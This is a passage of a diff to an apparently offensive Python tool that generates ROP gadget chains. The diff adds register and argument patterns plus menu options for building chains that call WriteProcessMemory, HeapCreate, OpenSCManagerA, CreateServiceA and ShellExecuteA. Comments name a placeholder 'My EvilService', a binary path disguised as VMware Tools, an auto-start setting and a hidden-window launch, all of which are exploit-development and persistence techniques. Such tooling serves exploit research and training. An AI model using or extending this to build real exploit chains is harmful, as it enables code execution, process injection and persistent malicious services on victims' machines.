+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'HC_RT', 'excluded':[], "r2":"",'com':'HeapCreateStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'dwInitialSize', 'excluded':[], "r2":"",'com':'dwInitialSize'}
+        },
+
+        'OSCM1':{
+        '9': {'valStr': 'dwDesiredAccess', 'val': 0x2, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwDesiredAccess'},
+		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'2': {'r': 'ebp', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
+		'3': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":"4",'com':''},
+		'4': {'r': 'ecx', 'val': 'lpMachineName', 'excluded':[], "r2":"",'com':'lpMachineName'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'OSCM_RT', 'excluded':[], "r2":"",'com':'OpenSCManagerAStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lpDatabaseName', 'excluded':[], "r2":"",'com':'lpDatabaseName'}
+        },
+
+        'CSA1':{
+        '9': {'valStr': 'lpDisplayName', 'val': 0, 'specialHandling':True, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpDisplayName'},  # TODO: varStr = 'My EvilService'
+        '10': {'valStr': 'dwDesiredAccess', 'val': 0x2, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwDesiredAccess - SC_MANAGER_CREATE_SERVICE'},
+        '11': {'valStr': 'dwServiceType', 'val': 0x10, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwServiceType - SERVICE_WIN32_OWN_PROCESS'},
+        '12': {'valStr': 'dwStartType', 'val': 0x2, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwStartType - SERVICE_AUTO_START'},
+        '13': {'valStr': 'dwErrorControl', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwErrorControl - SERVICE_ERROR_IGNORE'},
+        '14': {'valStr': 'lpBinaryPathName', 'val': 0, 'specialHandling':True, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpBinaryPathName'}, # TODO: varStr = 'C:\Program Files\VMware\VMware Tools\demo.exe'
+        '15': {'valStr': 'lpLoadOrderGroup', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpLoadOrderGroup'},
+        '16': {'valStr': 'lpdwTagId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpdwTagId'},
+        '17': {'valStr': 'lpDependencies', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpDependencies'},
+        '18': {'valStr': 'lpServiceStartName', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpServiceStartName'},
+        '19': {'valStr': 'lpPassword', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpPassword'},
+		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":"8",'com':''},
+		'2': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ecx', 'val': 'hSCManager', 'excluded':[], "r2":"",'com':'hSCManager'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'CSA_RT', 'excluded':[], "r2":"",'com':'CreateServiceAStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lpServiceName', 'excluded':[], "r2":"",'com':'lpServiceName'}
+        },
+
+		'SEA1':{
+        '1': {'r': 'edi', 'val': 'SEA_RT', 'excluded':[], "r2":"",'com':'ShellExecuteAStub'},
+		'2': {'r': 'ebp', 'val': 'hwnd', 'excluded':[], "r2":"",'com':'hwnd'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ecx', 'val': 'lpDirectory', 'excluded':[], "r2":"",'com':'lpDirectory'},
+		'5': {'r': 'esp', 'val': 'lpOperation', 'excluded':[], "r2":"",'com':'lpOperation'},
+		'6': {'r': 'ebx', 'val': 'lpFile', 'excluded':[], "r2":"",'com':'lpFile'},
+		'7': {'r': 'edx', 'val': 'lpParameters', 'excluded':[], "r2":"",'com':'lpParameters'},
+		'8': {'r': 'eax', 'val': 'nShowCmd', 'excluded':[], "r2":"",'com':'nShowCmd'}
         }
 
+     	# 'SEA2':{
+        # '9': {'valStr': 'lpFile', 'val': 0, 'specialHandling':True, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpFile'}, # TODO: varStr = 'calc'
+		# '10': {'valStr': 'lpParameters', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None,'com':'lpParameters'},
+		# '11': {'valStr': 'lpDirectory', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpDirectory'},
+		# '12': {'valStr': 'nShowCmd', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None,'com':'nShowCmd - SW_HIDE'},
+        # '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":"8",'com':''},
+		# '2': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		# '3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		# '4': {'r': 'ecx', 'val': 'hwnd', 'excluded':[], "r2":"",'com':'hwnd'},
+		# '5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		# '6': {'r': 'ebx', 'val': 'SEA_RT', 'excluded':[], "r2":"",'com':'ShellExecuteAStub'},
+		# '7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		# '8': {'r': 'eax', 'val': 'lpOperation', 'excluded':[], "r2":"",'com':'lpOperation'}
+        # },
+
+        }
 
 
 def giveMovDValsFromDict(curPat, t,i):
-	# '9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'StructPointer': False, 'StructType':None, 'com':'This is a test value'},
+	# '9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'This is a test value'},
 	valStr=curPat[i][str(t)]["valStr"]
 	val=curPat[i][str(t)]["val"]
 	specialHandling=curPat[i][str(t)]["specialHandling"]
+	hasPointer=curPat[i][str(t)]["hasPointer"]
 	StructPointer=curPat[i][str(t)]["StructPointer"]
 	StructType=curPat[i][str(t)]["StructType"]
 	com=curPat[i][str(t)]["com"]
-	return valStr, val, specialHandling, StructPointer, StructType,com
+	return valStr, val, specialHandling, hasPointer, StructPointer, StructType,com
 
 def giveRegValsFromDict(dict,t,i):
 	r=pat[i][str(t)]["r"]
@@ -13636,15 +13956,36 @@ def giveApiNum(winApi,j):
 	elif winApi == "OpenProcess":
 		apiNum=5
 		apiCode="OP"
+		size=9
 	elif winApi == "P32F":
 		apiNum=10
 		apiCode="P32F"
 	elif winApi == "RSKV":
-		apiNum=1
+		apiNum=2
 		apiCode="RSKV"
 	elif winApi == "RCKV":
 		apiNum=1
 		apiCode="RCKV"
+	elif winApi=="WriteProcessMemory":
+		apiNum=1
+		apiCode="WPM"
+		size=11
+	elif winApi=="HeapCreate":
+		apiNum=1
+		apiCode="HC"
+		size=9
+	elif winApi=="OpenSCManagerA":
+		apiNum=1
+		apiCode="OSCM"
+		size=9
+	elif winApi=="CreateServiceA":
+		apiNum=1
+		apiCode="CSA"
+		size=19
+	elif winApi=="ShellExecuteA":
+		apiNum=1
+		apiCode="SEA"
+		# size=12
 	elif winApi == "Test":
 		apiNum=1
 		apiCode="Test"
@@ -13757,7 +14098,7 @@ def buildPushad(bad, patType):
 
 	elif patType == "RSKV":
 		stopCode="RSKV"
-		foundInnerRV,outputsTxtRV, outputsTxtCRV,outputsPkRV=buildPushadInner(bad,excludeRegs2,"RSKV",1,"apiCode",pk,pk,stopCode)
+		foundInnerRV,outputsTxtRV, outputsTxtCRV,outputsPkRV=buildPushadInner(bad,excludeRegs2,"RSKV",2,"apiCode",pk,pk,stopCode)
 		if foundInnerRV:
 			printGadgetChain(outputsTxtRV, "RegSetKeyValueA")
 
@@ -13766,11 +14107,42 @@ def buildPushad(bad, patType):
 		foundInnerRC,outputsTxtRC, outputsTxtCRC,outputsPkRC=buildPushadInner(bad,excludeRegs2,"RCKV",1,"apiCode",pk,pk,stopCode)
 		if foundInnerRC:
 			printGadgetChain(outputsTxtRC, "RegCreateKeyA")
+
+	elif patType == "WriteProcessMemory":
+		stopCode="WPM"
+		foundInnerWPM,outputsTxtWPM, outputsTxtCWPM,outputsPkWPM=buildPushadInner(bad,excludeRegs2,"WriteProcessMemory",1,"apiCode",pk,pk,stopCode)
+		if foundInnerWPM:
+			printGadgetChain(outputsTxtWPM, "WriteProcessMemory")
+
+	elif patType == "HeapCreate":
+		stopCode="HC"
+		foundInnerHC,outputsTxtHC, outputsTxtCHC,outputsPkHC=buildPushadInner(bad,excludeRegs2,"HeapCreate",1,"apiCode",pk,pk,stopCode)
+		if foundInnerHC:
+			printGadgetChain(outputsTxtHC, "HeapCreate")
+
+	elif patType == "OpenSCManagerA":
+		stopCode="OSCM"
+		foundInnerOSCM,outputsTxtOSCM, outputsTxtCOSCM,outputsPkOSCM=buildPushadInner(bad,excludeRegs2,"OpenSCManagerA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerOSCM:
+			printGadgetChain(outputsTxtOSCM, "OpenSCManagerA")
+
+	elif patType == "CreateServiceA":
+		stopCode="CSA"
+		foundInnerCSA,outputsTxtCSA, outputsTxtCCSA,outputsPkCSA=buildPushadInner(bad,excludeRegs2,"CreateServiceA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerCSA:
+			printGadgetChain(outputsTxtCSA, "CreateServiceA")
+
+	elif patType == "ShellExecuteA":
+		stopCode="SEA"
+		foundInnerSEA,outputsTxtSEA, outputsTxtCSEA,outputsPkSEA=buildPushadInner(bad,excludeRegs2,"ShellExecuteA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerSEA:
+			printGadgetChain(outputsTxtSEA, "ShellExecuteA")
+
 	elif patType == "Test":
 		stopCode="Test"
 		foundInnerRC,outputsTxtRC, outputsTxtCRC,outputsPkRC=buildPushadInner(bad,excludeRegs2,"Test",1,"apiCode",pk,pk,stopCode)
 		if foundInnerRC:
-			printGadgetChain(outputsTxtRC, "RegCreateKeyA")
+			printGadgetChain(outputsTxtRC, "Test")
 
 def buildPushadOld(excludeRegs,bad, myArgs ,numArgs):
 	global PWinApi
@@ -16450,6 +16822,40 @@ def genRegCreateKeyA():
 	timeStop = timeit.default_timer()
 	print(red, " Time:", yel, str(timeStop - timeStart), res)
 
+def genWriteProcessMemory():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "WriteProcessMemory")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genHeapCreate():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "HeapCreate")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genOpenSCManagerA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "OpenSCManagerA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genCreateServiceA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "CreateServiceA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genShellExecuteA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "ShellExecuteA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
 
 def genTest():
 	timeStart = timeit.default_timer()
@@ -17845,7 +18251,6 @@ def ui():
 
 				genMovDerefVP()
 			elif userIN[0:1] == "!":
-
 				genVirtualProtectPushad()
 			elif userIN[0:1] == "$":
 				genDeleteFileAPushad()
@@ -17869,6 +18274,16 @@ def ui():
 				genRegSetKeyValueA()
 			elif userIN[0:1] == "j":
 				genRegCreateKeyA()
+			elif userIN[0:2] == "33":
+				genWriteProcessMemory()
+			elif userIN[0:2] == "44":
+				genHeapCreate()
+			elif userIN[0:2] == "55":
+				genOpenSCManagerA()
+			elif userIN[0:2] == "66":
+				genCreateServiceA()
+			elif userIN[0:2] == "77":
+				genShellExecuteA()
 			elif userIN[0:2] == "22":
 				genTest()
 			elif userIN[0:1] == "o":
